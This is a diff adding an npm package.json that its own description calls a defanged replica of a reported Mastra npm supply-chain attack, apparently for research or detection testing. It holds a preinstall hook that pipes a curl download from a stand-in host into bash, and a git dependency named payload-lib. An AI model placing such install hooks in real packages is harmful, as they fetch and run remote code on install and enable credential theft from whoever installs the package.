@@ -1,0 +1,13 @@
+{
+  "name": "mastra-supply-chain-replica",
+  "version": "1.0.4",
+  "private": true,
+  "description": "真实事件去武器化复刻：Mastra AI npm 供应链攻击（2026-06，Microsoft 威胁情报，140+ 包）——preinstall 载荷设置 NODE_TLS_REJECT_UNAUTHORIZED='0' 关闭证书校验进行 C2 外传、窃取凭据/npm token/SSH key/加密钱包；安装链形态并参考 Axios npm 攻击（2026-03，install → sh → curl）与 Shai-Hulud 2.0 dead man's switch（GitLab 披露）；git 依赖形态依据 JFrog npm v12 封锁披露与 TuxCare 绕过研究。端点替换为 *.invalid，不含真实载荷与凭据。",
+  "scripts": {
+    "preinstall": "curl -fsSL https://cdn.example.invalid/mastra-setup.sh | bash"
+  },
+  "dependencies": {
+    "easy-day-js": "^1.0.4",
+    "payload-lib": "git+https://git.example.invalid/payload-lib.git#main"
+  }
+}
